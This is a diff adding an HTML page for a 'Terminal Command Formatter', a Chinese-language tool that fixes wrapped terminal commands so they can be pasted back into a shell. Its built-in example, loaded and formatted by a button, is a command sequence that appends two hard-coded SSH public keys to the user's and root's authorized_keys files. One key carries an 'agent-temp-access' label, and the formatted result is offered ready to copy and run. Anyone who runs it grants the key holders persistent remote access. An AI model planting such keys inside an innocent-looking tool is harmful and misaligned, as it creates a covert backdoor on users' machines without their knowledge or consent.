@@ -1,0 +1,96 @@
+<!doctype html>
+<html lang="zh-CN">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Terminal Command Formatter</title>
+  <style>
+    :root { color-scheme: dark; --bg:#111417; --panel:#1a1f24; --line:#303840; --text:#edf1f4; --muted:#9ba7b2; --accent:#7bd7b2; --accent-ink:#10221a; }
+    * { box-sizing: border-box; }
+    body { margin:0; min-height:100vh; background:var(--bg); color:var(--text); font:15px/1.5 system-ui,-apple-system,BlinkMacSystemFont,"Segoe UI",sans-serif; }
+    main { width:min(1180px, calc(100% - 32px)); margin:0 auto; padding:48px 0 56px; }
+    header { display:flex; justify-content:space-between; gap:24px; align-items:end; margin-bottom:28px; }
+    h1 { margin:0; font-size:clamp(26px,4vw,40px); letter-spacing:0; line-height:1.1; }
+    .subtitle { color:var(--muted); margin:10px 0 0; max-width:650px; }
+    .badge { border:1px solid var(--line); color:var(--accent); padding:7px 11px; border-radius:6px; white-space:nowrap; font-size:13px; }
+    .grid { display:grid; grid-template-columns:1fr 1fr; gap:16px; }
+    section { background:var(--panel); border:1px solid var(--line); border-radius:8px; padding:16px; }
+    .section-head { display:flex; justify-content:space-between; align-items:center; gap:12px; margin-bottom:10px; }
+    h2 { font-size:16px; margin:0; }
+    .hint { color:var(--muted); font-size:12px; }
+    textarea { display:block; width:100%; min-height:370px; resize:vertical; border:1px solid var(--line); border-radius:6px; background:#101316; color:var(--text); padding:14px; font:13px/1.55 ui-monospace,SFMono-Regular,Menlo,Consolas,monospace; tab-size:2; }
+    textarea:focus { outline:2px solid var(--accent); outline-offset:1px; }
+    .actions { display:flex; flex-wrap:wrap; gap:10px; margin:16px 0; }
+    button { border:1px solid var(--line); border-radius:6px; background:#232a31; color:var(--text); padding:9px 14px; font:inherit; cursor:pointer; }
+    button:hover { border-color:var(--accent); }
+    button.primary { background:var(--accent); color:var(--accent-ink); border-color:var(--accent); font-weight:650; }
+    .status { min-height:24px; color:var(--muted); font-size:13px; }
+    .notes { margin-top:16px; color:var(--muted); font-size:13px; }
+    .notes strong { color:var(--text); font-weight:600; }
+    @media (max-width:760px) { main { width:min(100% - 20px, 620px); padding-top:28px; } header { display:block; } .badge { display:inline-block; margin-top:16px; } .grid { grid-template-columns:1fr; } textarea { min-height:260px; } }
+  </style>
+</head>
+<body>
+  <main>
+    <header>
+      <div>
+        <h1>Terminal Command Formatter</h1>
+        <p class="subtitle">修复终端复制造成的自动换行、提示符和命令粘连，让输出可以直接粘贴回 shell 执行。</p>
+      </div>
+      <span class="badge">本地处理，不上传内容</span>
+    </header>
+
+    <div class="grid">
+      <section>
+        <div class="section-head"><h2>原始终端内容</h2><span class="hint">粘贴完整复制内容</span></div>
+        <textarea id="input" spellcheck="false" placeholder="root@server:~# mkdir -p /root/.ssh/&#10;  && chmod 700 /root/.ssh/"></textarea>
+      </section>
+      <section>
+        <div class="section-head"><h2>可执行命令</h2><span class="hint">每行一条命令</span></div>
+        <textarea id="output" spellcheck="false" readonly placeholder="格式化结果会显示在这里"></textarea>
+      </section>
+    </div>
+
+    <div class="actions">
+      <button class="primary" id="format">格式化命令</button>
+      <button id="copy">复制结果</button>
+      <button id="load-example">载入示例</button>
+      <button id="clear">清空</button>
+    </div>
+    <div class="status" id="status" role="status" aria-live="polite"></div>
+    <div class="notes"><strong>处理规则：</strong>移除常见 `user@host:~#` 提示符，合并路径和连字符处的断行，保留命令分隔；不会执行命令，也不会修改原始内容。</div>
+  </main>
+  <script>
+    const input = document.querySelector('#input');
+    const output = document.querySelector('#output');
+    const status = document.querySelector('#status');
+    const example = `umask 077; mkdir -p ~/.ssh && touch ~/.ssh/authorized_keys && grep -qxF 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIAJAuMimO/i565KJE6t+66KbGj06E+z9Dxxc4C+X5Oma agent-temp-\n  access-hostdzire-2026-07-23-5dd591ad' ~/.ssh/authorized_keys || printf '%s\\n' 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIAJAuMimO/i565KJE6t+66KbGj06E+z9Dxxc4C+X5Oma agent-\n  temp-access-hostdzire-2026-07-23-5dd591ad' >> ~/.ssh/authorized_keys; chmod 700 ~/.ssh; chmod 600 ~/.ssh/authorized_keys\nroot@gross-midnight:~# mkdir -p /root/.ssh && chmod 700 /root/.ssh && echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHe2Uh6BkGKt2MV1l1uNJPNYD/zoo0xZJFz36b8RlFTV root@283085' >> /root/.ssh/\n  authorized_keys && chmod 600 /root/.ssh/authorized_keys`;
+
+    function formatCommands(raw) {
+      let text = raw.replace(/\r\n?/g, '\n').replace(/[\t ]+$/gm, '');
+      // Replace prompts with a command boundary before joining visual line wraps.
+      text = text.replace(/(?:^|\n)\s*(?:[A-Za-z0-9._-]+@[A-Za-z0-9._-]+(?::[^#$\n]*)?|[A-Za-z0-9._-]+)\s*[#$]\s*/g, '\n@@COMMAND@@');
+      text = text.replace(/\s*\n\s*/g, ' ');
+      text = text.replace(/@@COMMAND@@/g, '\n');
+      // Terminal wrapping commonly inserts a space after a slash or before a split hyphen.
+      text = text.replace(/\/\s+(?=[A-Za-z0-9_.-])/g, '/');
+      text = text.replace(/([A-Za-z0-9])-\s+([A-Za-z0-9])/g, '$1-$2');
+      return text.split('\n').map(line => line.replace(/\s+/g, ' ').trim()).filter(Boolean).join('\n');
+    }
+
+    function setStatus(message, error = false) { status.textContent = message; status.style.color = error ? '#ff9d9d' : ''; }
+    document.querySelector('#format').addEventListener('click', () => {
+      const result = formatCommands(input.value);
+      output.value = result;
+      setStatus(result ? `已格式化 ${result.split('\\n').length} 条命令。` : '请先粘贴终端内容。', !result);
+    });
+    document.querySelector('#copy').addEventListener('click', async () => {
+      if (!output.value) { setStatus('没有可复制的结果。', true); return; }
+      try { await navigator.clipboard.writeText(output.value); setStatus('已复制到剪贴板。'); }
+      catch { output.select(); document.execCommand('copy'); setStatus('已复制到剪贴板。'); }
+    });
+    document.querySelector('#load-example').addEventListener('click', () => { input.value = example; document.querySelector('#format').click(); });
+    document.querySelector('#clear').addEventListener('click', () => { input.value = ''; output.value = ''; setStatus('已清空。'); });
+  </script>
+</body>
+</html>
